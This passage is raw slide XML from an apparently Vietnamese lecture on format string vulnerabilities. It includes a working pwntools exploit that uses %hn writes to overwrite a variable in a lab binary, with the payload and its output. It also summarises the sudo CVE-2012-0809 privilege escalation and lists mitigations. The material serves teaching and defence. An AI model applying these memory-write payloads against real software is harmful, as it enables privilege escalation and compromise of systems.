                <a:spcPts val="992"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> Vì ghi 2 lần nên ta sẽ đặt 2 địa chỉ liên tiếp cách nhau 2 byte của biến money lên stack như sau : </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="16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spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="186" name=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7772400" y="457200"/>
            <a:ext cx="3814560" cy="3454920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="187" name=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4975920"/>
            <a:ext cx="10286280" cy="1653120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>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8" name="TextBox 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="5774040" cy="5468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Calibri"/>
              </a:rPr>
              <a:t>WRITE — exploit : %hn write 2 byte</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="189" name="TextBox 139"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1201680"/>
            <a:ext cx="10969200" cy="51019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Consolas"/>
              </a:rPr>
              <a:t>p = process(['setarch', 'x86_64', '-R', './fmt'])</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Consolas"/>
              </a:rPr>
              <a:t>p.recvuntil(b'money @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Consolas"/>
              </a:rPr>
              <a:t>money_addr = int(p.recvuntil(b' ', drop=True).decode(), 16)</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Consolas"/>
              </a:rPr>
              <a:t>print(f'&amp;money = {hex(money_addr)}')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>payload = (b'XXXXXX%48873c%12$hn%8126c%13$hn' + b'\x00' + p64(money_addr) + p64(money_addr + 2))</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Consolas"/>
              </a:rPr>
              <a:t>p.sendline(payload)</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Consolas"/>
              </a:rPr>
              <a:t>out = p.recvall(timeout=5).decode(errors='replace')</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Consolas"/>
              </a:rPr>
              <a:t>for l in out.split(chr(10)):</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Consolas"/>
              </a:rPr>
              <a:t>    if 'money' in l.lower() or 'FLAG' in l: print(l[:60])</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Consolas"/>
              </a:rPr>
              <a:t>Giải thích : 6'X'+48873=48879=0xBEEF → %12$hn ghi 2 byte THẤP ; +8126=57005=0xDEAD → %13$hn ghi 2 byte CAO</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Consolas"/>
              </a:rPr>
              <a:t>→ money = 0xDEADBEEF</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spcBef>
                <a:spcPts val="201"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="0B6623"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>$ python3 ex.py</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="201"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="0B6623"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>b'XXXXXX%48873c%12$hn%8126c%13$hn\x00\x9c\xdc\xff\xff\xff\x7f\x00\x00\x9e\xdc\xff\xff\xff\x7f\x00\x00'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="201"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="0B6623"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>&amp;money = 0x7ffed7f0162c</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="201"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="0B6623"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>FLAG{money_set}</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0" name="TextBox 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="10969560" cy="81972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Arial"/>
              </a:rPr>
              <a:t>CVE-2012-0809 — Sudo format string → root</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="191" name="TextBox 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1234440"/>
            <a:ext cx="10969560" cy="3746520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="90000" tIns="45000" rIns="90000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Sản phẩm : Sudo 1.8.0 – 1.8.3p1 (setuid root)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Nguyên nhân : sudo_debug() dùng fprintf(stderr, user_controlled) thay vì fprintf(stderr, "%s", ...)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>   → format string từ input của user (debug option / env)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Điều kiện : local user, có quyền chạy sudo (hoặc set SUDO_DEBUG)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Tác động : privilege escalation → root (sudo chạy với quyền root)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Khắc phục : nâng cấp lên 1.8.3p2+ ; bản chất fix : dùng format string literal</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Source : https://seclists.org/fulldisclosure/2012/Jan/att-590/advisory_sudo.txt</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2" name=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="896760" y="0"/>
            <a:ext cx="10074960" cy="5451120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="193" name=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="423000" y="5636880"/>
            <a:ext cx="11234520" cy="9914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2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Ở đây, getprogname() lấy giá trị từ argv[0], mà giá trị này do người dùng kiểm soát.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> Vì vậy, argv[0] được truyền vào fmt2, sau đó được xử lý bởi hàm vfprintf() để in ra stderr.</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4" name=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="-41760" y="462600"/>
            <a:ext cx="14899680" cy="5022720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>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5" name=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1015200"/>
            <a:ext cx="12187440" cy="5155920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="196" name=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="257040"/>
            <a:ext cx="1887480" cy="65628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4000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>PATCH</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>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7" name="TextBox 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="10969560" cy="81972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Arial"/>
              </a:rPr>
              <a:t>Khắc phục &amp; phòng ngừa</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="198" name="TextBox 147"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1234440"/>
            <a:ext cx="10969920" cy="4798800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="90000" tIns="45000" rIns="90000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Code fix (chính) : printf("%s", user_input) — không bao giờ truyền user input làm format</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Compile-time :</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>→ -Wformat -Wformat-security : cảnh báo khi format không phải string literal</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1191"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="992"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>→ FORTIFY_SOURCE: Với _FORTIFY_SOURCE=2, glibc sẽ chặn %n nếu format string nằm trong vùng nhớ có thể ghi.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1191"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="992"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Ví dụ:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>char fmt[] = "%n";  // Nhận từ input hoặc lưu trong stack</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>printf(fmt, &amp;n);    // Bị chặn và abort</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Ngược lại:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="127622"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="127622"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>printf("%n", &amp;n);   // Format string literal, được phép</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>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9" name="TextBox 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
